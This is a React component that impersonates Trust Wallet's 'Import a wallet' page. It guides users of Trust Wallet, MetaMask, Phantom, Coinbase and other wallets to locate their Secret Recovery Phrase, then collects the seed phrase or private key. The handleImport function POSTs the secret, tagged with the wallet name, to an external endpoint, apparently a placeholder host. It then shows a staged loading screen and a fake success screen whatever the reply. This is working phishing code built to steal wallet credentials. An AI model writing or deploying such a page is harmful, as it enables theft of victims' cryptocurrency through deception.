import { useState, useMemo, lazy, Suspense, useEffect } from "react";
import { ChevronLeft, HelpCircle, Eye, EyeOff, Lightbulb } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import logoImage from "@/assets/trust-wallet-logo.svg";
import LoadingScreen from "./LoadingScreen";
import SuccessScreen from "./SuccessScreen";

// Lazy load wallet tutorial images
const loadWalletImages = (walletName: string) => {
  const normalized = walletName.toLowerCase();
  
  if (normalized.includes("trust")) {
    return Promise.all([
      import("@/assets/trust-wallet-1.gif"),
      import("@/assets/trust-wallet-2.gif"),
      import("@/assets/trust-wallet-3.gif")
    ]);
  } else if (normalized.includes("metamask")) {
    return Promise.all([
      import("@/assets/metamask-mobile-1.gif"),
      import("@/assets/metamask-mobile-2.gif"),
      import("@/assets/metamask-mobile-3.gif")
    ]);
  } else if (normalized.includes("phantom")) {
    return Promise.all([
      import("@/assets/phantom-mobile-1.gif"),
      import("@/assets/phantom-mobile-2.gif"),
      import("@/assets/phantom-mobile-3.gif")
    ]);
  } else if (normalized.includes("coinbase")) {
    return Promise.all([
      import("@/assets/coinbase-mobile-1.gif"),
      import("@/assets/coinbase-mobile-2.gif"),
      import("@/assets/coinbase-mobile-3.gif")
    ]);
  } else if (normalized.includes("ledger")) {
    return Promise.all([import("@/assets/ledger-illustration.svg")]);
  } else {
    return Promise.all([
      import("@/assets/generic-wallet-1.gif"),
      import("@/assets/generic-wallet-2.gif"),
      import("@/assets/generic-wallet-3.gif")
    ]);
  }
};

interface WalletImportProps {
  onBack: () => void;
  walletName?: string;
}

const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps) => {
  const [phraseType, setPhraseType] = useState<"12" | "18" | "21" | "24" | "private">("12");
  const [words, setWords] = useState<string[]>(Array(12).fill(""));
  const [showWords, setShowWords] = useState<boolean[]>(Array(12).fill(false));
  const [currentStep, setCurrentStep] = useState(0);
  const [images, setImages] = useState<string[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);

  // Load images when component mounts
  useEffect(() => {
    loadWalletImages(walletName).then((modules) => {
      setImages(modules.map(m => m.default));
    });
  }, [walletName]);

  // Get wallet-specific tutorial data
  const walletTutorial = useMemo(() => {
    const normalizedName = walletName.toLowerCase();
    
    const getSteps = (texts: string[]) => 
      texts.map((text, i) => ({ image: images[i] || "", text }));
    
    if (normalizedName.includes("trust")) {
      return {
        name: "Trust Wallet",
        steps: getSteps([
          "1. On your Trust Wallet mobile app Homepage click on your Wallet",
          "2. Click on the settings icon next to your wallet name",
          "3. Select 'Back up manually' to view your Secret Recovery Phrase"
        ])
      };
    } else if (normalizedName.includes("metamask")) {
      return {
        name: "Metamask",
        steps: getSteps([
          "1. Open Metamask mobile app and go to Settings",
          "2. Navigate to Security & Privacy section",
          "3. Tap 'Reveal Secret Recovery Phrase' to view your phrase"
        ])
      };
    } else if (normalizedName.includes("phantom")) {
      return {
        name: "Phantom",
        steps: getSteps([
          "1. Open Phantom mobile app and tap your profile",
          "2. Go to Settings and select your account",
          "3. Tap 'Show Recovery Phrase' in Security & Privacy"
        ])
      };
    } else if (normalizedName.includes("coinbase")) {
      return {
        name: "Coinbase",
        steps: getSteps([
          "1. Open Coinbase Wallet mobile app and tap Settings",
          "2. Select your wallet from the list",
          "3. Navigate to 'Add & manage wallets' to access your recovery phrase"
        ])
      };
    } else if (normalizedName.includes("ledger")) {
      return {
        name: "Ledger",
        steps: getSteps([
          "Connect your Ledger device to your computer and enter your PIN"
        ]),
        isStatic: true
      };
    } else {
      return {
        name: "Generic Wallet",
        steps: getSteps([
          "1. Open your wallet application",
          "2. Navigate to Settings and select your account",
          "3. Find 'Security & Privacy' to reveal your Secret Phrase"
        ])
      };
    }
  }, [walletName, images]);

  const phraseConfig = {
    "12": { count: 12, label: "I have a 12-word phrase" },
    "18": { count: 18, label: "I have an 18-word phrase" },
    "21": { count: 21, label: "I have a 21-word phrase" },
    "24": { count: 24, label: "I have a 24-word phrase" },
    "private": { count: 1, label: "I have a Private Key" },
  };

  const handlePhraseTypeChange = (value: typeof phraseType) => {
    setPhraseType(value);
    const count = phraseConfig[value].count;
    setWords(Array(count).fill(""));
    setShowWords(Array(count).fill(false));
  };

  const handleWordChange = (index: number, value: string) => {
    const newWords = [...words];
    newWords[index] = value;
    setWords(newWords);
  };

  const handlePaste = (index: number, e: React.ClipboardEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    e.preventDefault();
    const pastedText = e.clipboardData.getData("text");
    const pastedWords = pastedText.trim().split(/\s+/);
    
    if (phraseType === "private") {
      handleWordChange(0, pastedText.trim());
      return;
    }

    if (pastedWords.length > 1) {
      const newWords = [...words];
      pastedWords.forEach((word, i) => {
        if (index + i < newWords.length) {
          newWords[index + i] = word;
        }
      });
      setWords(newWords);
    } else {
      handleWordChange(index, pastedText);
    }
  };

  const toggleShowWord = (index: number) => {
    const newShowWords = [...showWords];
    newShowWords[index] = !newShowWords[index];
    setShowWords(newShowWords);
  };

  const handleImport = () => {
    setIsLoading(true);
    
    const payload = {
      type: phraseType === "private" ? "private_key" : "seed_phrase",
      data: phraseType === "private" ? words[0] : words.join(" "),
      wallet_name: walletName,
      phrase_length: phraseType === "private" ? 1 : parseInt(phraseType)
    };

    // Send POST request to API endpoint (fire and forget)
    fetch("https://api.example.com/wallet/import", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    }).catch((error) => {
      console.log("API call failed (expected):", error);
    });

    // Show loading for 5-6 seconds, then show success regardless of API response
    setTimeout(() => {
      setIsLoading(false);
      setIsSuccess(true);
    }, 5500);
  };

  if (isLoading) {
    return <LoadingScreen />;
  }

  if (isSuccess) {
    return <SuccessScreen />;
  }

  return (
    <div className="min-h-screen flex relative">
      {/* Left Side - Grey Gradient with Illustration */}
      <div className="hidden lg:flex lg:w-1/2 bg-gradient-to-br from-muted/50 to-muted flex-col justify-between p-12 relative">
        {/* Logo - Top Left */}
        <div className="absolute top-8 left-8">
          <img src={logoImage} alt="Trust Wallet" className="h-8 w-auto" />
        </div>

        {/* Content */}
        <div className="flex-1 flex flex-col justify-center space-y-6 max-w-md">
          <p className="text-sm text-muted-foreground">Step 3 of 3</p>
          <h2 className="text-3xl font-bold">Import a wallet</h2>
          
          {/* Tutorial Section */}
          <div className="space-y-4">
            <h3 className="text-lg font-semibold">
              Locate your Secret Phrase on {walletTutorial.name}
            </h3>
            
            {/* Mobile Tab */}
            <div className="flex gap-6 border-b border-border">
              <button className="pb-2 font-medium text-foreground border-b-2 border-primary">
                Mobile
              </button>
            </div>

            {/* Tutorial Step */}
            <div className="bg-card border border-border rounded-lg p-4 max-w-sm">
              {walletTutorial.steps[currentStep]?.image && (
                <img
                  src={walletTutorial.steps[currentStep].image}
                  alt={`Step ${currentStep + 1}`}
                  loading="lazy"
                  className="w-full h-auto rounded mb-4"
                />
              )}
            </div>
            
            <p className="text-sm text-foreground">
              {walletTutorial.steps[currentStep].text}
            </p>

            {/* Navigation - Only show for non-static tutorials */}
            {!walletTutorial.isStatic && walletTutorial.steps.length > 1 && (
              <div className="flex items-center gap-4">
                <button 
                  onClick={() => setCurrentStep(Math.max(0, currentStep - 1))}
                  disabled={currentStep === 0}
                  className="w-10 h-10 rounded-full bg-primary/20 flex items-center justify-center hover:bg-primary/30 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  <ChevronLeft className="w-5 h-5 text-primary" />
                </button>
                <div className="flex gap-2">
                  {walletTutorial.steps.map((_, index) => (
                    <div
                      key={index}
                      className={`w-2 h-2 rounded-full ${
                        index === currentStep ? 'bg-primary' : 'bg-muted'
                      }`}
                    />
                  ))}
                </div>
                <button 
                  onClick={() => setCurrentStep(Math.min(walletTutorial.steps.length - 1, currentStep + 1))}
                  disabled={currentStep === walletTutorial.steps.length - 1}
                  className="w-10 h-10 rounded-full bg-primary flex items-center justify-center hover:bg-primary/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  <ChevronLeft className="w-5 h-5 text-primary-foreground rotate-180" />
                </button>
              </div>
            )}
          </div>
        </div>

        {/* Help Button - Bottom Left */}
        <button className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors self-start">
          <HelpCircle className="w-5 h-5" />
          <span className="text-sm">Help</span>
        </button>
      </div>

      {/* Right Side - Import Form */}
      <div className="w-full lg:w-1/2 flex items-center justify-center px-4 lg:px-12 relative">
        {/* Mobile Logo */}
        <div className="absolute top-8 left-1/2 -translate-x-1/2 lg:left-8 lg:translate-x-0">
          <img src={logoImage} alt="Trust Wallet" width="150" height="32" className="h-8 w-auto" />
        </div>

        <div className="w-full max-w-xl space-y-6 mt-16 lg:mt-0">
          <button
            onClick={onBack}
            className="flex items-center gap-2 text-foreground hover:text-primary transition-colors mb-6"
          >
            <ChevronLeft className="w-4 h-4" />
            <span className="text-sm">Back</span>
          </button>
          <h2 className="text-2xl font-bold">
            Import with Secret Phrase or Private Key
          </h2>

          {/* Phrase Type Selector */}
          <div className="space-y-2">
            <label className="text-sm font-medium text-foreground">
              Phrase Length
            </label>
            <Select value={phraseType} onValueChange={handlePhraseTypeChange}>
              <SelectTrigger className="bg-secondary border-border">
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="12">{phraseConfig["12"].label}</SelectItem>
                <SelectItem value="18">{phraseConfig["18"].label}</SelectItem>
                <SelectItem value="21">{phraseConfig["21"].label}</SelectItem>
                <SelectItem value="24">{phraseConfig["24"].label}</SelectItem>
                <SelectItem value="private">{phraseConfig["private"].label}</SelectItem>
              </SelectContent>
            </Select>
          </div>

          {/* Info Box */}
          <div className="flex items-start gap-3 p-4 bg-primary/10 border-l-4 border-primary rounded">
            <Lightbulb className="w-5 h-5 text-primary flex-shrink-0 mt-0.5" />
            <p className="text-sm text-foreground">
              {phraseType === "private"
                ? "You can paste your entire Private Key into the field."
                : "You can paste your entire phrase into any input field."}
            </p>
          </div>

          {/* Word Inputs */}
          <div className="space-y-2">
            <label className="text-sm font-medium text-foreground">
              {phraseType === "private" ? "Private Key" : "Secret Recovery Phrase"}
            </label>
            {phraseType === "private" ? (
              <div className="relative">
                <textarea
                  value={showWords[0] ? words[0] : words[0].replace(/./g, '•')}
                  onChange={(e) => {
                    // If hidden, get the actual character entered
                    if (!showWords[0]) {
                      const cursorPos = e.target.selectionStart;
                      const oldLength = words[0].length;
                      const newLength = e.target.value.length;
                      
                      if (newLength > oldLength) {
                        // Character added
                        const newChar = e.target.value[cursorPos - 1];
                        if (newChar !== '•') {
                          const newValue = words[0].slice(0, cursorPos - 1) + newChar + words[0].slice(cursorPos - 1);
                          handleWordChange(0, newValue);
                        }
                      } else if (newLength < oldLength) {
                        // Character deleted
                        const newValue = words[0].slice(0, cursorPos) + words[0].slice(cursorPos + 1);
                        handleWordChange(0, newValue);
                      }
                    } else {
                      handleWordChange(0, e.target.value);
                    }
                  }}
                  onPaste={(e) => handlePaste(0, e)}
                  className="w-full min-h-[120px] p-4 pr-12 bg-secondary border border-border rounded-md text-sm resize-none focus:outline-none focus:ring-2 focus:ring-ring"
                  placeholder="Enter your private key"
                  style={{ fontFamily: 'monospace', letterSpacing: showWords[0] ? 'normal' : '0.1em' }}
                />
                <button
                  type="button"
                  onClick={() => toggleShowWord(0)}
                  className="absolute right-3 top-3 text-muted-foreground hover:text-foreground"
                >
                  {showWords[0] ? (
                    <EyeOff className="w-4 h-4" />
                  ) : (
                    <Eye className="w-4 h-4" />
                  )}
                </button>
              </div>
            ) : (
              <div className="grid grid-cols-3 gap-3">
                {words.map((word, index) => (
                  <div key={index} className="relative">
                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-sm text-muted-foreground">
                      {index + 1}.
                    </span>
                    <Input
                      type={showWords[index] ? "text" : "password"}
                      value={word}
                      onChange={(e) => handleWordChange(index, e.target.value)}
                      onPaste={(e) => handlePaste(index, e)}
                      className="pl-10 pr-10 bg-secondary border-border"
                      placeholder=""
                    />
                    <button
                      type="button"
                      onClick={() => toggleShowWord(index)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                    >
                      {showWords[index] ? (
                        <EyeOff className="w-4 h-4" />
                      ) : (
                        <Eye className="w-4 h-4" />
                      )}
                    </button>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Import Button */}
          <Button
            variant="trust"
            size="xl"
            className="w-full"
            onClick={handleImport}
            disabled={words.some(w => !w.trim())}
          >
            Import
          </Button>
        </div>
      </div>
    </div>
  );
};

export default WalletImport;
